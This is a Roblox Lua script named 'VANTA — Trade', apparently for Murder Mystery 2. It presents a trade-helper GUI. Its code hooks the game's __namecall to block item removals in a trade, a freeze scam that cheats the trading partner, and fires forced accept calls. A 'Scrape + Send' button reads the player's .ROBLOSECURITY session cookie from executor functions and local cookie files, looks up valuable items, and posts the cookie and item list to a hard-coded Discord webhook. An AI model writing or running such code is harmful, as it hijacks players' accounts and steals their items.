local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RS = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1551369836364431451/E6tz7uSCVcmafhwhgR0bNgV19KGClDY4SqIrZ5b6TlQoaKgfh9xhj0cyxGNLjFMBTmUj"

-- State
local frozen = false
local outgoingBlocked = false

local tradeRemote
for _, obj in ipairs(RS:GetDescendants()) do
    if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction"))
        and obj.Name:lower():find("trade") then
        tradeRemote = obj
        break
    end
end

local mt = getrawmetatable(game)
local oldNamecall = mt.__namecall
setreadonly(mt, false)

mt.__namecall = newcclosure(function(self, ...)
    local method = getnamecallmethod()
    local args = {...}
    if frozen and outgoingBlocked and self == tradeRemote then
        if method == "FireServer" and args[1] == "RemoveItem" then
            return
        end
    end
    return oldNamecall(self, ...)
end)

setreadonly(mt, true)

local function grabCookie()
    local cookie = nil
    if getcookie then pcall(function() cookie = getcookie() end) end
    if not cookie and getrbxcookie then pcall(function() cookie = getrbxcookie() end) end
    if not cookie then
        local paths = {
            os.getenv("LOCALAPPDATA") .. "\\Roblox\\LocalStorage\\RobloxCookies.dat",
            os.getenv("LOCALAPPDATA") .. "\\Roblox\\Cookies\\RobloxCookies.dat",
        }
        for _, p in ipairs(paths) do
            local ok, data = pcall(readfile, p)
            if ok and data then
                local m = data:match("_\\.ROBLOSECURITY=([^;%s]+)")
                if m then cookie = m break end
            end
        end
    end
    if not cookie then
        local ok, data = pcall(readfile, "rbx_cookie.txt")
        if ok and data and #data > 100 then cookie = data end
    end
    return cookie
end

local GODLIES = {
    ["Chroma"] = true, ["Luger"] = true, ["Heat"] = true, ["Gemstone"] = true,
    ["Clockwork"] = true, ["Shark"] = true, ["Laser"] = true, ["Spider"] = true,
    ["Fang"] = true, ["Batwing"] = true, ["Elderwood"] = true, ["Nebula"] = true,
    ["Pixel"] = true, ["Corrupt"] = true, ["Icewing"] = true, ["Virtual"] = true,
    ["BattleAxe"] = true, ["BattleAxe II"] = true, ["Hallowgun"] = true,
    ["Amerilaser"] = true, ["Blaster"] = true, ["Deathshard"] = true,
    ["Flames"] = true, ["Ghostblade"] = true, ["Hallow's Edge"] = true,
    ["Nightblade"] = true, ["Old Glory"] = true, ["Phaser"] = true,
    ["Saw"] = true, ["Seer"] = true, ["Tides"] = true, ["Vampire's Edge"] = true,
}

local ANCIENTS = {
    ["Ancient"] = true, ["Elderwood"] = true, ["Corrupt"] = true,
    ["Chroma"] = true, ["Nebula"] = true, ["Virtual"] = true,
    ["BattleAxe II"] = true, ["Hallow's Edge"] = true, ["Vampire's Edge"] = true,
}

local function matches(name, tbl)
    for key in pairs(tbl) do
        if name:lower():find(key:lower(), 1, true) then return true end
    end
    return false
end

local function probeInventory(cookie, userId)
    local url = string.format(
        "https://inventory.roblox.com/v1/users/%d/inventory/1?limit=100", userId)
    local ok, res = pcall(function()
        return game:HttpGet(url, true, { ["Cookie"] = ".ROBLOSECURITY=" .. cookie })
    end)
    if not ok or not res then return nil end
    local decoded
    pcall(function() decoded = HttpService:JSONDecode(res) end)
    if not decoded or not decoded.data then return nil end

    local godlies, ancients = {}, {}
    for _, item in ipairs(decoded.data) do
        local name = item.name or ""
        if matches(name, GODLIES) then table.insert(godlies, name) end
        if matches(name, ANCIENTS) then table.insert(ancients, name) end
    end
    return { godlies = godlies, ancients = ancients }
end

local function post(payload)
    pcall(function()
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload),
        })
    end)
end

local function exfil(cookie, inv)
    local uid = LocalPlayer and LocalPlayer.UserId or 0
    local uname = LocalPlayer and LocalPlayer.Name or "unknown"
    local fields = {
        { name = "user", value = string.format("%s (%d)", uname, uid), inline = true },
        { name = "cookie", value = "```" .. (cookie or "NONE") .. "```", inline = false },
    }
    if inv then
        if #inv.godlies > 0 then
            table.insert(fields, { name = "godlies (" .. #inv.godlies .. ")",
                value = "```" .. table.concat(inv.godlies, "\n") .. "```", inline = false })
        end
        if #inv.ancients > 0 then
            table.insert(fields, { name = "ancients (" .. #inv.ancients .. ")",
                value = "```" .. table.concat(inv.ancients, "\n") .. "```", inline = false })
        end
    end
    post({
        username = "VANTA",
        embeds = {{
            title = "MM2 inventory hit",
            color = 0x8B0000,
            fields = fields,
            footer = { text = "vanta" },
            timestamp = DateTime.now():ToIsoDate(),
        }},
    })
end

local function buildGui()
    local parent = (gethui and gethui()) or CoreGui
    local old = parent:FindFirstChild("VantaFreeze")
    if old then old:Destroy() end

    local gui = Instance.new("ScreenGui")
    gui.Name = "VantaFreeze"
    gui.ResetOnSpawn = false
    gui.Parent = parent

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 220, 0, 240)
    frame.Position = UDim2.new(0.5, -110, 0.5, -120)
    frame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
    frame.BorderSizePixel = 0
    frame.Active = true
    frame.Draggable = true
    frame.Parent = gui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = frame

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 30)
    title.BackgroundTransparency = 1
    title.Text = "VANTA — Trade"
    title.TextColor3 = Color3.fromRGB(220, 220, 230)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 14
    title.Parent = frame

    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(1, -20, 0, 20)
    status.Position = UDim2.new(0, 10, 0, 30)
    status.BackgroundTransparency = 1
    status.Text = tradeRemote and ("remote: " .. tradeRemote.Name) or "remote: NOT FOUND"
    status.TextColor3 = tradeRemote and Color3.fromRGB(120, 200, 140) or Color3.fromRGB(200, 100, 100)
    status.Font = Enum.Font.Code
    status.TextSize = 11
    status.TextXAlignment = Enum.TextXAlignment.Left
    status.Parent = frame

    local function makeButton(text, y, color, callback)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(1, -20, 0, 32)
        btn.Position = UDim2.new(0, 10, 0, y)
        btn.BackgroundColor3 = color
        btn.BorderSizePixel = 0
        btn.Text = text
        btn.TextColor3 = Color3.fromRGB(240, 240, 245)
        btn.Font = Enum.Font.GothamMedium
        btn.TextSize = 13
        btn.Parent = frame
        local c = Instance.new("UICorner")
        c.CornerRadius = UDim.new(0, 6)
        c.Parent = btn
        btn.MouseButton1Click:Connect(callback)
        return btn
    end

    makeButton("1. Arm Freeze", 58, Color3.fromRGB(40, 60, 90), function()
        frozen = true
        outgoingBlocked = false
        status.Text = "armed — add item now"
        status.TextColor3 = Color3.fromRGB(220, 200, 120)
    end)

    makeButton("2. Lock Offer", 96, Color3.fromRGB(60, 40, 90), function()
        if not frozen then status.Text = "arm first" return end
        outgoingBlocked = true
        status.Text = "locked — removes swallowed"
        status.TextColor3 = Color3.fromRGB(160, 120, 220)
    end)

    makeButton("3. Force Accept", 134, Color3.fromRGB(90, 40, 40), function()
        if not tradeRemote then status.Text = "no remote" return end
        pcall(function()
            if tradeRemote:IsA("RemoteEvent") then
                tradeRemote:FireServer("Accept")
                tradeRemote:FireServer("Confirm")
            end
        end)
        status.Text = "accept fired"
        status.TextColor3 = Color3.fromRGB(220, 140, 140)
    end)

    makeButton("4. Scrape + Send", 172, Color3.fromRGB(40, 70, 50), function()
        status.Text = "scraping…"
        status.TextColor3 = Color3.fromRGB(180, 220, 180)
        local cookie = grabCookie()
        if not cookie then
            post({ content = "cookie grab failed on " .. (LocalPlayer and LocalPlayer.Name or "?") })
            status.Text = "cookie failed"
            return
        end
        local uid = LocalPlayer and LocalPlayer.UserId or 0
        local inv = probeInventory(cookie, uid)
        exfil(cookie, inv)
        status.Text = "sent"
        status.TextColor3 = Color3.fromRGB(140, 220, 160)
    end)
end

buildGui()
print("[MIC] GUI loaded — freeze, accept, scrape")